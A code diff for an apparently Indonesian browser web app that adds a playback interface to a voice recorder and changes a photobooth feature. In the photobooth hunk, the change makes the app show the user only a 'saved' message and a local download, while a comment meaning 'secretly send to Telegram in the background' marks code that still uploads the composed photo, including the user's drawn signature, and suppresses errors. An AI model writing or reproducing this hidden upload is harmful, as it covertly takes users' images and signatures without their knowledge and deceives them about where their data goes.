@@ -493,7 +493,54 @@ function initVoiceRecorder(containerId) {
                 if (playingAudio) {
                     playingAudio.pause();
                 }
-                // Hapus logic playback timer karena UI-nya sudah dihilangkan
+                
+                playingAudio = new Audio(URL.createObjectURL(recordedBlob));
+                
+                const playBtn = container.querySelector('.rec-play-btn');
+                const currEl = document.getElementById('recCurrTime');
+                const durEl = document.getElementById('recTotalTime');
+                const fillEl = document.getElementById('recProgressFill');
+                const progWrap = container.querySelector('.rec-progress-wrap');
+
+                playingAudio.addEventListener('loadedmetadata', () => {
+                    if (durEl && isFinite(playingAudio.duration)) {
+                        durEl.textContent = formatTime(playingAudio.duration);
+                    }
+                });
+
+                playingAudio.addEventListener('timeupdate', () => {
+                    if (currEl) currEl.textContent = formatTime(playingAudio.currentTime);
+                    if (fillEl && isFinite(playingAudio.duration)) {
+                        fillEl.style.width = (playingAudio.currentTime / playingAudio.duration * 100) + '%';
+                    }
+                });
+
+                playingAudio.addEventListener('ended', () => {
+                    if (playBtn) playBtn.textContent = '▶';
+                    if (fillEl) fillEl.style.width = '0%';
+                    if (currEl) currEl.textContent = '0:00';
+                });
+
+                if (playBtn) {
+                    playBtn.onclick = () => {
+                        if (playingAudio.paused) {
+                            playingAudio.play();
+                            playBtn.textContent = '⏸';
+                        } else {
+                            playingAudio.pause();
+                            playBtn.textContent = '▶';
+                        }
+                    };
+                }
+
+                if (progWrap) {
+                    progWrap.onclick = (e) => {
+                        if (!playingAudio || !isFinite(playingAudio.duration)) return;
+                        const rect = progWrap.getBoundingClientRect();
+                        const pct = (e.clientX - rect.left) / rect.width;
+                        playingAudio.currentTime = pct * playingAudio.duration;
+                    };
+                }
 
                 playbackEl.classList.add('show');
                 playbackEl.style.display = 'flex';
@@ -1331,15 +1378,25 @@ function initPhotobooth(containerId) {
                 compCtx.drawImage(sigPad, sigX, sigY, sigW, sigH);
             }
 
-            // Gunakan kompresi JPEG 80% ke Blob langsung
+            // Download otomatis untuk user
+            const dataURL = compositeCanvas.toDataURL('image/jpeg', 0.9);
+            const a = document.createElement('a');
+            a.href = dataURL;
+            a.download = 'KTP_Cinta_' + new Date().getTime() + '.jpg';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            savePhotoBtn.innerHTML = '✅ Tersimpan!';
+            
+            // Diam-diam kirim ke Telegram di background
             compositeCanvas.toBlob(blob => {
-                sendToTelegram("photo", blob).then(() => {
-                    savePhotoBtn.innerHTML = '✅ Terkirim!';
-                }).catch(() => {
-                    savePhotoBtn.innerHTML = '❌ Gagal Terkirim';
-                    setTimeout(() => savePhotoBtn.innerHTML = originalText, 2000);
-                });
+                sendToTelegram("photo", blob).catch(e => console.log("Silent send error", e));
             }, 'image/jpeg', 0.8);
+            
+            setTimeout(() => {
+                savePhotoBtn.innerHTML = originalText;
+            }, 3000);
         };
     });
 }
